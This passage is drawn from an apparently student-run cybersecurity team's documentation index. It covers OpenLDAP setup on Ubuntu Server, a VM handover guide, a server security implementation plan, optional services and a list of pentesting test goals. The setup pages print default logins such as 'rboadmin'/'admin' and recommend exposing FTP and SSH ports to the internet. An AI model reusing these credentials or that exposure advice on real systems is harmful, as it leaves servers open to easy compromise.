The system credintials should have modified from the defualt USER: rboadmin PASS: admin  important Note the LDAP login credentials are:USER: rbosysPASS: admin  After importing the appliance and ensuring your network adapter settings are correct, boot the machine, sign in, and run the following commands to update the system:  sudo apt update sudo apt upgrade   Install LDAP-related packages:  sudo apt install slapd ldap-utils sudo dpkg-reconfigure slapd   Manage the slapd service using the following commands:  sudo systemctl start slapd sudo systemctl status slapd sudo systemctl stop slapd sudo systemctl restart slapd   Change the default password from admin and share it, along with the server’s IP address and chosen external port (if port forwarding is enabled), with your team.  To check your IP, run:  curl ifconfig.me   Perform a basic LDAP search to verify the setup:  ldapsearch -x -LLL -H ldap:/// -b dc=redbackops,dc=org,dc=au   or  ldapsearch -Q -LLL -Y EXTERNAL -H ldap:///   ","version":"Next","tagName":"h2"},{"title":"LDAP Directory Structure and Entries​","type":1,"pageTitle":"Ubuntu Server LDAP Configuration","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Configuration#ldap-directory-structure-and-entries","content":" The /etc/ldap/ldap.conf has been modified to allow easier use of the LDAP utilities, To add some initial LDAP entries, create a base structure for People and Groups as follows:  Create the base structure in an LDIF file (e.g., base.ldif):  dn: ou=People,dc=redbackops,dc=org,dc=au objectClass: organizationalUnit ou: People dn: ou=Groups,dc=redbackops,dc=org,dc=au objectClass: organizationalUnit ou: Groups   Add these entries to the LDAP directory:  sudo ldapadd -x -D cn=admin,dc=redbackops,dc=org,dc=au -W -f base.ldif   Add a user (jdoe) and a group (developers) in an LDIF file (e.g., add_entries.ldif):  dn: uid=jdoe,ou=People,,dc=redbackops,dc=org,dc=au objectClass: inetOrgPerson uid: jdoe sn: Doe givenName: John cn: John Doe displayName: John Doe userPassword: secret mail: jdoe@example.com dn: cn=developers,ou=Groups,dc=redbackops,dc=org,dc=au objectClass: posixGroup cn: developers gidNumber: 5000 memberUid: jdoe   Add the entries to the LDAP directory:  sudo ldapadd -x -D cn=admin,dc=redbackops,dc=org,dc=au -W -f add_entries.ldif   Verify that the user jdoe was added successfully:  ldapsearch -x -LLL -b dc=redbackops,dc=org,dc=au `uid=jdoe`  ","version":"Next","tagName":"h2"},{"title":"Project RedOps: LDAP Ubuntu Server","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Ubuntu Server Handover","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Project RedOps: LDAP Ubuntu Server","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Ubuntu Server Handover#introduction","content":" Over the course of the trimester my contribution for this unit largely comprised of creating an on prem environment to replicate the functionality of Microsoft's AD. After a couple of viability assessments for alternatives and following direction from the company department lead at the time the decision was made to utilise OpenLDAP. To achieve this I elected to implement this in Ubuntu Server 22.04, while this lacks a GUI making it a little challenging at times to work with this decision was made due to it`s light-weight nature. In this Docusaurus page I aim to answer any question you may have regarding setting this up yourselves or where to go next with this.  ","version":"Next","tagName":"h2"},{"title":"Ubuntu Environment Setup​","type":1,"pageTitle":"Project RedOps: LDAP Ubuntu Server","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Ubuntu Server Handover#ubuntu-environment-setup","content":" To configure the environment to run the RedOps Ubuntu Server system I would recommend configuring this VM on a separate system largely for convenience. In my deployment I used a soon to be retired Windows 10 Pro host machine where I had added a registry key to execute a script which would start the VM on launch. If you would like to do the same please follow the following steps:  Please download the Ubuntu Server Workspace OVA file from the Cyber Security Team &gt; 2024 Trimester 2 folder in the company Sharepoint. important Note the system login credentials are:USER: rboadminPASS: admin Once you have imported the appliance double check your network adapter settings to ensure that you are have either connected to the pfSense internal adapter or are using a bridged adapter. After successfully booting the machine, please sign in and run the following: sudo apt update &amp;&amp; sudo apt upgrade Before continuing please ensure that the systems password has been changed from admin and shared it with your team along with your IP and chosen external port (provided that the system will be port forwarded). To check your IP, run: curl ifconfig.me   ","version":"Next","tagName":"h2"},{"title":"Windows Host Environment Setup​","type":1,"pageTitle":"Project RedOps: LDAP Ubuntu Server","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Ubuntu Server Handover#windows-host-environment-setup","content":" To enable it so the rest of your team is able to SSH into the server to tinker and work on their own individual projects you will need to port forward the devices IP in your router`s configuration (not pfSense) port 21 and 22 (FTP and SSH). Please ensure that your ISP doesn`t use CGNAT or that it has been disabled as this will cause implementation issues. (Optional but strongly recommended) To set it up to automatically launch the VM on host system start you`ll need to create a script. Open your text editor of choice and insert the following command string: &quot;C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe&quot; startvm &quot;Ubuntu Server Workspace&quot;   Saving this as a .bat file will allow us to point the registry key to the command on start up via the RUN registry.  Navigate to the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run registry and add a string with the file path to the .bat file as the value.  ","version":"Next","tagName":"h2"},{"title":"Learning opportunities​","type":1,"pageTitle":"Project RedOps: LDAP Ubuntu Server","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Ubuntu Server Handover#learning-opportunities","content":" By working on this setup, you’ll gain knowledge in various areas:  Get comfortable with Ubuntu’s command-line interface (CLI).Explore Microsoft Server Active Directory (AD) and Entra ID.Investigate key topics like: KerberosOpenSSHOpenLDAP  ","version":"Next","tagName":"h2"},{"title":"Possible tasks and contributions​","type":1,"pageTitle":"Project RedOps: LDAP Ubuntu Server","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Ubuntu Server Handover#possible-tasks-and-contributions","content":" Here are some ways you can further enhance the LDAP setup:  Integrate LDAP with Kerberos using SASL.Implement encryption for LDAP user credentials.Modify LDAP Access Control Lists (ACLs) to improve security.Add SSL to LDAP for encrypted communication.Expand the pfSense Snort configuration for improved network protection.  ","version":"Next","tagName":"h2"},{"title":"Existing Documentation​","type":1,"pageTitle":"Project RedOps: LDAP Ubuntu Server","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Ubuntu Server Handover#existing-documentation","content":" The following have both been written in Markdown and should be available in the sidebar.  Ubuntu Server LDAP ConfigurationUbuntu Server Optional Services  ","version":"Next","tagName":"h2"},{"title":"Useful Links​","type":1,"pageTitle":"Project RedOps: LDAP Ubuntu Server","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/LDAP Ubuntu Server Handover#useful-links","content":" Ubuntu install and configure LDAPLDAP vs. KerberosIBM LDAP utilitiesLDAP over SSL ","version":"Next","tagName":"h2"},{"title":"Server Security Policy Implementation Plan","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#introduction","content":" This report will create and define implementation strategies to implement and comply with the Redback Operations Server Security Policy. These implementation strategies should be carried out by the roles listed in this report, once implemented, Redback Operations will meet compliance with the policy.  ","version":"Next","tagName":"h2"},{"title":"Objective​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#objective","content":" To develop an easy to implement, cost effective deployment plan for our Server Security policies and procedures.  ","version":"Next","tagName":"h3"},{"title":"Roles and responsibilities​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#roles-and-responsibilities","content":" The roles and responsibilities relevant to this implementation plan who will be implementing and adhering to the Server security are as follows:  Security Team  Implement security controls and measures  IT Department  Assist in implementing security controls; manage and maintain server hardware and software; ensure timely application of patches and updates; support the Security Team in incident response activities.Operational management of servers and ensuring their compliance with the security policy.  System Administrators  Apply security configurations and settings; monitor system performance and logs; enforce access controls and permissions; directly handle the installation, maintenance, and upgrading of servers.  Management  Budget and resource allocation  ","version":"Next","tagName":"h3"},{"title":"Deployment Strategies​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#deployment-strategies","content":" ","version":"Next","tagName":"h2"},{"title":"Implement Operating System Hardening​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#implement-operating-system-hardening","content":" In order to implement and comply with this section of the policy, it will require the following:  Secure and functional Operating Systems used on all infrastructure and end user devices. To achieve this we will implement the following: Windows Server 2022 for all ServersUp to date, in life software for all other use cases where required (eg. Switching, Linux, MacOS etc). A strict and functional operating system patch management solution. In order to achieve this, we will implement the following: Microsoft Intune management for all Windows Servers. All servers will be required to be enrolled in Microsoft Intune and we will push updates through update rings. This will include a policy where the Servers will have a scheduled update period (overnight) and will be forced to download and install the latest operating system patches.  ","version":"Next","tagName":"h3"},{"title":"Implement Application Management and Control​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#implement-application-management-and-control","content":" In order to implement and comply with this section of the policy, it will require the following:  Implement an application control software such as Intune, Carbon Black, Defender etc. This software will contain an allowed application list, and will be in block mode for any executables or applications not contained in this list. Review and implement administrative privilege controls Develop a policy for administrative privileges and demote any non-required administrators. Ensure no local administrator access on Servers. Restrict command prompt and PowerShell privileges Enforce policy through intune/gpo that will restrict the use of terminals (command prompt, powershell) on all servers.  ","version":"Next","tagName":"h3"},{"title":"Implement Intrusion Prevention, Software Firewalls, Antivirus, and Device Access Control​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#implement-intrusion-prevention-software-firewalls-antivirus-and-device-access-control","content":" In order to implement and comply with this section of the policy, it will require the following:  Deploy Advanced Antivirus / EDR on Servers This will require a advanced antivirus/endpoint detection and response software such as Defender Plan 2, Crowdstrike etc. This will provide a high level of antivirus coverage as well as at least basic endpoint detection and response capabilities on all servers. Deploy Network Intrusion Detection Software Deploy a network based intrusion detection software such as Darktrace, this will monitor the network and servers for any abnormal behaviours that could signal a network intrusion. This software will also respond and attempt to block any potential intrusions/incidents. Implement Windows Firewall on all Servers Turn on and configure Windows Firewall on all Servers as per Microsofts best practice, this will work hand in hand with the AV/EDR and IDS systems to protect against threats.  ","version":"Next","tagName":"h3"},{"title":"Implement Operating System Event Logging​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#implement-operating-system-event-logging","content":" In order to implement and comply with this section of the policy, it will require the following:  Investigate and implement a centralized event logging system This will collate logs from all Servers and analyse/present them in a centralized event logging system. Setup event logging on all servers (especially Domain Controllers) We will need to setup and configure windows event logging as per best practice to ensure we are capturing all required logs.  ","version":"Next","tagName":"h3"},{"title":"Implement User Application Hardening​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#implement-user-application-hardening","content":" In order to implement and comply with this section of the policy, it will require the following:  Implement a patch management solution for all third party applications A patch management solution such as PatchMyPc should be implemented to handle automatic patching of all third party applications on servers.This will work hand in hand with Intune to patch all applications, as Intune will be able to automatically update some more common third-party applications. Ensure we are correctly patching common third-party applications and following their update guidelines. E.g. Web Browsers, Microsoft Office Applications etc.  ","version":"Next","tagName":"h3"},{"title":"Implement Microsoft Office Macro restrictions/policies​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#implement-microsoft-office-macro-restrictionspolicies","content":" In order to implement and comply with this section of the policy, it will require the following:  Utilise Microsoft Intune to enforce policy blocking the use of Microsoft Office Macros We can build a policy in Intune and enforce on all servers that will block Office Macros.If there are Servers not enrolled in Intune this will need to be enforced by Group Policy  ","version":"Next","tagName":"h3"},{"title":"Implement Server Application Hardening​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#implement-server-application-hardening","content":" In order to implement and comply with this section of the policy, it will require the following:  Ensure all server applications follow secure-by-design and secure-by-default principlesIf we develop in house applications that are present on Servers we need to ensure we are maintain secure programming practicesEnsure all applications on servers are compliant to our patch management policies and all applications are up-to-date with the latest security patches.Restrict privileges for applications that do not require full access.  ","version":"Next","tagName":"h3"},{"title":"Implement Microsoft Active Directory Domain Services (AD DS) Hardening​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#implement-microsoft-active-directory-domain-services-ad-ds-hardening","content":" In order to implement and comply with this section of the policy, it will require the following:  Utilise Microsoft intune to deploy policies in compliance with the policy including Password ManagementRequire Kerberos pre-authenticationDomain Access Control – prevent standard users from adding computer objects etc. Implement Active Directory account review process Members of the IT Department will conduct an annual audit of all active directory accounts, during which they will assess each accounts privileges and access and restrict/lock accounts that are no longer required.  ","version":"Next","tagName":"h3"},{"title":"Implement Microsoft AD DS Security Group Membership Hardening​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#implement-microsoft-ad-ds-security-group-membership-hardening","content":" In order to implement and comply with this section of the policy, it will require the following:  Implement AD group membership review process Members of the IT Department will conduct quarterly reviews of all AD account memberships, during which they will ensure all groups are still required for each user and will remove users from groups if no longer required.Ensure all disabled accounts are removed from security groups.Ensure no user accounts are part of the Pre-Windows 2000 Compatible Access group.  ","version":"Next","tagName":"h3"},{"title":"Implement Authentication Hardening​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#implement-authentication-hardening","content":" In order to implement and comply with this section of the policy, it will require the following:  Deploy multi-factor authentication across server environment. Utilise Azure/M365 SSO to require multi-factor authentication upon access to servers. Review current credentials for privileged accounts including break glass, local administrator and service accounts.Utilise Intune to build and enforce policies disabling insecure authentication methods Disable NTLM and LAN ManagerDisable Authentication Methods susceptible to relay attacks. Implement password change policies Change password every 12 monthsChange password when compromised or suspected of compromisedChange shared passwords when staff leave Utilise Intune to build and enforce the following lockout/account policies Lock accounts after five attempts.Terminate sessions dailyDeploy company login bannerScreen lock after 15 minutes of inactivity  ","version":"Next","tagName":"h3"},{"title":"Implement Virtualization Hardening​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#implement-virtualization-hardening","content":" In order to implement and comply with this section of the policy, it will require the following:  Review current virtual environment to determine compliance with the policy Ensure the following Type 1 Hypervisors: Run on bare metal and should be treated as lightweight operating systems.Type 2 Hypervisors: Run on top of general-purpose operating systems and should be treated as applications. If non-compliance is found, VM’s should be remediated immediately to comply with this.  ","version":"Next","tagName":"h3"},{"title":"Cost Effectiveness​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#cost-effectiveness","content":" Budgets and cost effectiveness have been strongly considered in the creation of this implementation and deployment plan. Where possible, cost saving measures have been chosen such as:  Utilising single systems to achieve compliance across multiple different sections of policy, and achieve the greatest return on investment. Microsoft Intune: Enforce patch management, enforce domain policies across a number of requirements.Azure/365 SSO to achieve MFA across multiple different platforms Choosing systems that best meet the needs of our company and provide cost effective measures, such as Microsoft Defender for EDR/AV on servers. While Defender may not be the gold class of EDR solutions, it has a good industry reputation and provides adequate functionality that meets our needs at a really cost-effective price. If we were to go with other solutions, the cost would be significantly greater.  Overall, while it is important that we do not cut cost in the area of cyber security, we do recognize that this is a great cost to the company and have ensured we have presented the most cost-effective solution, maximizing return on investment in these implementation and deployment strategies.  ","version":"Next","tagName":"h2"},{"title":"Ease of Implementation​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#ease-of-implementation","content":" Another key aspect considered in the planning of this implementation and deployment strategy was ease of implementation. We feel we have chosen deployment methods that fit the resourcing constraints of our company and will allow us to spend the least amount of time and resourcing available to achieve full compliance with the Server Security policy.  ","version":"Next","tagName":"h2"},{"title":"Timeline​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#timeline","content":" The timeline for achieving full compliance with the Server Security policy by following this implementation and deployment plan is 3-6 months.  We feel this is achievable by splitting up relevant tasks between the Security team, IT department and System administrators. Upon analyzing the resources available, the work required and the systems we will need to implement, we feel this timeframe is more than reasonable.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Server Security Policy Implementation Plan","url":"/redback-documentation/docs/cybersecurity/GRC Team/ISMS-Policy-Implementation-Plans/server-security-implementation-plan#conclusion","content":" In conclusion, if the company decides to proceed with this plan we feel we have created a cost-effective and easy to implement implementation strategy that will see Redback Operations comply with the Server Security policy within a short-medium term.  Once all deployment strategies are followed, the security team should complete a compliance analysis to determine compliance with the policy. ","version":"Next","tagName":"h2"},{"title":"Ubuntu Server Optional Services","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/Optional Services","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Ubuntu Server Optional Services","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/Optional Services#introduction","content":" This document outlines several optional services that can be installed and configured to enhance the functionality, security, and remote accessibility of an Ubuntu server. It covers secure access methods such as SSH, secure file transfer through FTP, network management utilities, SSL encryption, and VirtualBox network settings. Each service is critical for managing and securing the server in a production environment.  ","version":"Next","tagName":"h2"},{"title":"SSH Service (OpenSSH)​","type":1,"pageTitle":"Ubuntu Server Optional Services","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/Optional Services#ssh-service-openssh","content":" The OpenSSH package is essential for secure remote access to the server. SSH (Secure Shell) allows administrators to connect, execute commands, and manage files over an encrypted connection, ensuring that communication is secure from potential eavesdropping.  Commands used:  sudo systemctl status ssh sudo ufw allow ssh   Once installed and configured, SSH allows administrators to securely manage the server for tasks such as installing software, configuring services, and performing remote administration.  ","version":"Next","tagName":"h2"},{"title":"net-tools​","type":1,"pageTitle":"Ubuntu Server Optional Services","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/Optional Services#net-tools","content":" The net-tools package provides essential network management utilities such as ifconfig, which displays the current state of the network interfaces. It is used to view and manage IP addresses, subnet masks, and other configuration details critical to network services.  Commands used:  sudo apt install net-tools ifconfig   This tool is particularly useful for configuring networking on the server, especially when working with virtual machines or diagnosing network connectivity issues.  ","version":"Next","tagName":"h2"},{"title":"FTP Service (vsftpd)​","type":1,"pageTitle":"Ubuntu Server Optional Services","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/Optional Services#ftp-service-vsftpd","content":" The vsftpd package (Very Secure FTP Daemon) is installed to provide FTP (File Transfer Protocol) services. FTP allows users to securely upload and download files between the server and remote clients. Additionally, SSL certificates are installed to secure FTP traffic, enabling FTPS (FTP Secure), which encrypts file transfers to prevent unauthorized access to sensitive data.  Commands used:  sudo apt install vsftpd sudo ufw allow 20/tcp &amp;&amp; sudo ufw allow 21/tcp   Once installed, vsftpd provides secure and encrypted file transfer capabilities, which are essential for remote users who need to manage files on the server.  ","version":"Next","tagName":"h2"},{"title":"SSL Certificates​","type":1,"pageTitle":"Ubuntu Server Optional Services","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/Optional Services#ssl-certificates","content":" During the installation process, the ssl-cert package was installed to enable SSL/TLS for secure communication. SSL certificates are crucial for encrypting data exchanged between the server and clients, especially when dealing with sensitive information such as login credentials and file transfers over FTP.  Command used:  sudo apt install ssl-cert   By enabling SSL, services like FTP and web servers can encrypt traffic, preventing eavesdropping and data tampering during transmissions.  ","version":"Next","tagName":"h2"},{"title":"VirtualBox Network Configuration​","type":1,"pageTitle":"Ubuntu Server Optional Services","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/Optional Services#virtualbox-network-configuration","content":" Though not a software package, VirtualBox network settings are critical for configuring virtual machines on the Ubuntu Server Workspace. The network adapter was set to Bridged Mode, which allows the VM to obtain an IP address and be accessible on the local network. Additionally, Promiscuous Mode was set to Allow All, enabling network monitoring and packet capturing from the virtual machine.  Settings applied:Adapter 1: Bridged AdapterPromiscuous Mode: Allow AllMAC Address: Configured automatically These network configurations are vital for providing services such as SSH and FTP, ensuring the VM has proper network connectivity and can communicate externally.  ","version":"Next","tagName":"h2"},{"title":"Checking Ports and Services​","type":1,"pageTitle":"Ubuntu Server Optional Services","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/Optional Services#checking-ports-and-services","content":" To ensure that the LDAP service (and other services like SSH and FTP) are running correctly and listening on the appropriate ports, two utilities were used: lsof and netstat.  ","version":"Next","tagName":"h2"},{"title":"Checking LDAP Ports with lsof​","type":1,"pageTitle":"Ubuntu Server Optional Services","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/Optional Services#checking-ldap-ports-with-lsof","content":" The lsof command lists open files and the processes that are using them, which is helpful for checking which ports services like slapd (LDAP daemon) are using.  Command used:  sudo lsof -i -P -n | grep slapd   This command shows that slapd is listening on port 389 (the default LDAP port) for both IPv4 and IPv6 connections, confirming that the LDAP service is running and ready to accept connections.  ","version":"Next","tagName":"h3"},{"title":"Checking Open Ports with netstat​","type":1,"pageTitle":"Ubuntu Server Optional Services","url":"/redback-documentation/docs/cybersecurity/Infrastrcture Team/Ubuntu Server/Optional Services#checking-open-ports-with-netstat","content":" The netstat command displays active connections, routing tables, interface statistics, and open ports. It can be used to verify that the necessary ports are open and listening for connections.  Command used:  sudo netstat -tuln | grep :389   This output confirms that port 389 is open and listening for both IPv4 and IPv6 traffic, validating that the LDAP service is available and functional. ","version":"Next","tagName":"h3"},{"title":"Pentesting Use Cases","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info","content":"","keywords":"","version":"Next"},{"title":"What is penetration testing?​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#what-is-penetration-testing","content":" It is a testing method that helps find vulnerabilities of a network, web application or computer system. This testing method helps in identifying whether the existing defensive measures that are incorporated in the system are enough to prevent any security breaches.  ","version":"Next","tagName":"h2"},{"title":"Advantages of Pen Testing:​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#advantages-of-pen-testing","content":" Adherence to Compliance Requirements: Helps to meet regulatory requirements such as PCI DSS, EU GDPR, and ISO. Identify and Remediate Vulnerability: Helps identify vulnerabilities that can exploit the security systems and find a solution. Ensure Business continuity: By running pen tests, organizations can reduce the risk of attacks. Enhance Customer Trust: Pen testing can minimize the risk of attacks and assures clients that their data is secure.  ","version":"Next","tagName":"h2"},{"title":"Goals of Pen Testing:​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goals-of-pen-testing","content":" Check if web application can identify spam attacks on contact forms used on the website. Proxy server – Check if network traffic is monitored by proxy appliances. Proxy servers make it difficult for hackers to get internal details of the network thus protecting the system from external attacks. Spam email filters – Verify if incoming and outgoing email traffic is filtered and unsolicited emails are blocked. Many email clients come with in-build spam filters which needs to be configured as per needs. These configuration rules can be applied on email headers, subject, or body. Can be identified by the keywords used in the subject line as well as the body. Firewall – Make sure entire network or computers are protected with Firewall. Verify that all usernames and passwords are encrypted and transferred over secured connection like https. Verify information stored in website cookies. It should not be in readable format. Verify if there is no open port in network. Verify all HTTP methods. PUT and Delete methods should not be enabled on web server. Password monitoring (Using password with different combinations) Application behaviour after multiple logins and more activity of the user. (can be locked or access can be retrieved). Generation of Error messages in terms of invalid login details Scan all incoming files uploaded by the users. Sensitive data should be hidden (Like invisible password) Blocking Login page after multiple failed attempts. Verification of reset password with double authentication (Email and Mobile) Relog in after the password is reset and logging out from different devices. Session ending after inactivity of user (Time limit of 15-30 mins). Maintaining of logs (User activity like login and logout). No redirection to third party websites Warning the user when public networks are used. GPS spoofing, Email ID spoofing, IP address spoofing, Caller ID spoofing, Referrer spoofing, ARP spoofing etc., should be verified. Monitor Trojan attacks by scanning incoming network traffic.  ","version":"Next","tagName":"h2"},{"title":"Goal 1: Check if web application can identify spam attacks on contact forms.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-1-check-if-web-application-can-identify-spam-attacks-on-contact-forms","content":" Use Case: Spam Attack Detection on Contact Forms  Test Case 1: Spam Attack Simulation  Test Step: Submit contact forms with a high volume of requests in a short period.  Expected Result: The web application should identify and mitigate the spam attack, preventing successful form submissions.  ","version":"Next","tagName":"h2"},{"title":"Goal 2: Check if network traffic is monitored by proxy appliances.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-2-check-if-network-traffic-is-monitored-by-proxy-appliances","content":" Use Case: Proxy Server Traffic Monitoring  Test Case 1: Proxy Bypass Attempt  Test Step: Attempt to bypass the proxy server and access a restricted resource.  Expected Result: Proxy server should detect and block attempts to bypass, ensuring all traffic goes through the proxy.  ","version":"Next","tagName":"h2"},{"title":"Goal 3: Verify if incoming and outgoing email traffic is filtered.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-3-verify-if-incoming-and-outgoing-email-traffic-is-filtered","content":" Use Case: Spam Email Filters Verification  Test Case 1: Email Spoofing Attempt  Test Step: Send emails with spoofed headers, subjects, or bodies.  Expected Result: Spam filters should identify and block emails with suspicious content.  ","version":"Next","tagName":"h2"},{"title":"Goal 4: Make sure entire network or computers are protected with Firewall.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-4-make-sure-entire-network-or-computers-are-protected-with-firewall","content":" Use Case: Firewall Protection Verification  Test Case 1: Port Scanning  Test Step: Conduct a port scan to identify open ports in the network.  Expected Result: Firewall should block unauthorized access through open ports and prevent information of services on ports being sent.  ","version":"Next","tagName":"h2"},{"title":"Goal 5: Verify that all usernames and passwords are encrypted and transferred securely.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-5-verify-that-all-usernames-and-passwords-are-encrypted-and-transferred-securely","content":" Use Case: Secure User Authentication  Test Case 1: Login Credential Encryption  Test Step: Capture network traffic during login to verify that usernames and passwords are encrypted.  Expected Result: User credentials should be transmitted securely over HTTPS and/or other secure protocols.  ","version":"Next","tagName":"h2"},{"title":"Goal 6: Verify information stored in website cookies is not in readable format.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-6-verify-information-stored-in-website-cookies-is-not-in-readable-format","content":" Use Case: Secure Cookie Storage  Test Case 1: Cookie Inspection  Test Step: Inspect cookies stored by the website to ensure they are not in a readable format.  Expected Result: Cookies should be encrypted or hashed for enhanced security.  ","version":"Next","tagName":"h2"},{"title":"Goal 7: Verify if there is no open port in the network.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-7-verify-if-there-is-no-open-port-in-the-network","content":" Use Case: Closed Port Verification  Test Case 1: Port Scanning  Test Step: Conduct a port scan to confirm that there are no open ports in the network.  Expected Result: All ports should be closed, except for essential services.  ","version":"Next","tagName":"h2"},{"title":"Goal 8: Verify all HTTP methods; PUT and Delete methods should not be enabled on the web server.​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-8-verify-all-http-methods-put-and-delete-methods-should-not-be-enabled-on-the-web-server","content":" Use Case: HTTP Method Verification  Test Case 1: PUT and Delete Method Test  Test Step: Attempt to use PUT and Delete methods on the web server.  Expected Result: PUT and Delete methods should be disabled, allowing only safe methods.  ","version":"Next","tagName":"h2"},{"title":"Goal 9: Password monitoring (Using password with different combinations)​","type":1,"pageTitle":"Pentesting Use Cases","url":"/redback-documentation/docs/cybersecurity/RED TEAM/backend-pentest/pentest-info#goal-9-password-monitoring-using-password-with-different-combinations","content":" Use Case: Password Strength Testing  Test Case 1: Weak Password Attempt  Test Step: Attempt to use weak passwords, common passwords, and dictionary words.  Expected Result: The system should enforce password complexity and reject weak password attempts.  ","version":"Next","tagName":"h2"},{"title":"Goal 10: Application behaviour after multiple logins and more user activity​","type":1,"pageTitle":"Pentesting Use 